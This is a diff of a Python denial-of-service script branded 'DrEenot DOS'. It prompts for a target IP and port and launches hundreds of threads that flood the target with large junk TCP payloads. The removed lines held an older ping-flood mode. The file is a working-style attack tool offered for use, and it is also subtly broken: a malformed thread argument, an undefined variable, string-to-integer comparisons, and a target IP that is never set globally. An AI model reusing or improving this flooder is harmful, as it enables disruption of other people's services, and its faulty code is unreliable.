@@ -1,95 +1,87 @@
 '''
 Dos(Raw)
 '''
+
 import socket
-import subprocess as sub
-import threading,sys
-ip = ''
-def DosP():    
-    while True:
-        try:
-            sub.run(command,shell=False,check=False)
-        except:
-            continue
-        
-def Dos(ip,port):
+import threading
+
+IP = ''
+PACKET_SIZE = 60000
+N_OF_THREADS = 500
+
+def credintials():# :>
+    print(' _____       ______                 _      ')
+    print('|  __ \     |  ____|               | |     ')
+    print('| |  | |_ __| |__   ___ _ __   ___ | |_    ')
+    print("| |  | | '__|  __| / _ \ '_ \ / _ \| __|   ")
+    print('| |__| | |  | |___|  __/ | | | (_) | |_    ')
+    print('|_____/|_|  |______\___|_| |_|\___/ \__|   ')
+    print(' ______ ______ ______ ______ ______ ______ ')
+    print('|______|______|______|______|______|______|')
+    print('|  __ \ / __ \ / ____|                     ')
+    print('| |  | | |  | | (___                       ')
+    print('| |  | | |  | |\___ \                      ')
+    print('| |__| | |__| |____) |                     ')
+    print('|_____/ \____/|_____/                      ')
+    print('\n\n\n\n\n')
+
+    
+#main static dos function       
+def static_port_dos_main(port):
+    global PACKET_SIZE, IP
     while True:
         sc = socket.socket()
         try:
-            sc.connect((ip,port))
+            sc.connect((IP , port))
         except:
             pass
 
         while True:
-            dt = 'q'*65500
+            dt = 'q'*PACKET_SIZE
             try:
-                sc.send(dt.encode('utf-8'))
-               
+                sc.send(dt.encode('utf-8'))               
             except:
                 sc.close()
-                break
+                break    
+#Just creates threads for static dos
+def static_port_dos(port):
+    global N_OF_THREADS    
+    threads_pool = []    
+    for i in range(N_OF_THREADS):
+        threads_pool.append(threading.Thread(target = static_port_dos_main, args=(port)))
         
-    
-    
+    for i in range(N_OF_THREADS):
+        try:
+            threads_pool[i].start()
+        except:
+            pass
+    print(len(threads),'threads active')    
+    for i in range(N_OF_THREADS):
+        try:
+            threads_pool[i].join()
+        except:
+            pass
 
-def CheckIps(port):
-    global ip
-    n = 500
-    
-    e = []
-    t = []
-    print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Eenot Dos~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nDon`t use -p func, standart dos better")
-    if port == 'a':
-        n = 10
-        for i in range(n+1):
-            e.append(threading.Event())
-        for i in range(n):
-            t.append(threading.Thread(target = DosP, args=()))
+#def dynamic_port_dos(start_port,end_port):
+     
 
-        for i in range(n):
-            try:
-                t[i].start()
-            except:
-                pass
-        for i in range(n):
-            try:        
-                e[i].set()
-            except:
-                pass
-        for i in range(n):
-            try:        
-                t[i].join()
-            except:
-                pass
-    else:    
-        for i in range(n):
-            t.append(threading.Thread(target = Dos, args=(ip,port)))
-        for i in range(n):
-            try:
-                t[i].start()
-            except:
-                pass
-        for i in range(n):
-            try:
-                t[i].join()
-            except:
-                pass
-try:
-    if sys.argv[1] == '-p':
-        IP = sys.argv[2]
-        #print('OK')
-        command = 'ping -n 1 -l/ 65500 '+IP
-        #print('OK')
-        CheckIps('a')
-    else:
-        print('invalid argument')
-        print('Usage: -p(optional) ip(optional)')
-        pass 
-except:          
+def main():
+    
     PR = int(input("Port : "))
-    ip = input("IP : ")
-    CheckIps(PR)
-CheckIps('a')
+    IP = input("IP : ")
+    ps = input("Packet size(0 if default): ")
+    no = input("Number of threads(0 if default): ")
+    print('\n')
+    if ps > 0:
+        PACKET_SIZE = ps
+        
+    if no > 0:
+        N_OF_THREADS = no
+        
+    static_port_dos(PR)
 
 
+if __name__ == '__main__':
+    credintials()
+    main()
 
